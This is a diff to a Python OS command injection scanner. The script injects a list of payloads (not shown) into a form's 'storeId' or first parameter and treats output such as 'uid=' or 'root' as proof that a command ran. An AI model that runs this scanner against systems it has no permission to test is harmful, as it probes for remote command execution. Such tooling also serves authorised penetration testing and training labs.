@@ -1,5 +1,6 @@
 import requests
 from bs4 import BeautifulSoup
+from urllib.parse import urljoin
 
 # Define a list of payloads for visible OS command injection
 visible_payloads = [
@@ -35,19 +36,29 @@ def find_form_action_and_params(url):
     return None, None
 
 def test_visible_injection(url, method, action, initial_params, payloads):
-    full_url = url + action
+    full_url = urljoin(url, action)
     for payload in payloads:
         params = initial_params.copy()
         # Assuming we need to inject in storeId, if another parameter is needed, adjust accordingly
-        params['storeId'] = payload
-        if method == 'POST':
-            response = requests.post(full_url, data=params)
+        if 'storeId' in params:
+            params['storeId'] = payload
         else:
-            response = requests.get(full_url, params=params)
-        if response.status_code == 200:
-            response_text = response.text.lower()
-            if any(keyword in response_text for keyword in ['root', 'uid=', 'linux', 'bin/', 'daemon', 'sys']):
-                return f'[+] Visible Injection Detected with payload: {payload}'
+            # If 'storeId' is not present, inject payload into the first parameter
+            first_param = next(iter(params))
+            params[first_param] = payload
+        
+        try:
+            if method == 'POST':
+                response = requests.post(full_url, data=params)
+            else:
+                response = requests.get(full_url, params=params)
+                
+            if response.status_code == 200:
+                response_text = response.text.lower()
+                if any(keyword in response_text for keyword in ['root', 'uid=', 'linux', 'bin/', 'daemon', 'sys']):
+                    return f'Visible Injection Detected with payload: {payload}'
+        except requests.RequestException as e:
+            return f"Error occurred while testing {method} with payload: {payload}. Error: {e}"
     return 'No OS command injection vulnerabilities detected.'
 
 def scan_os_command_injection(url):
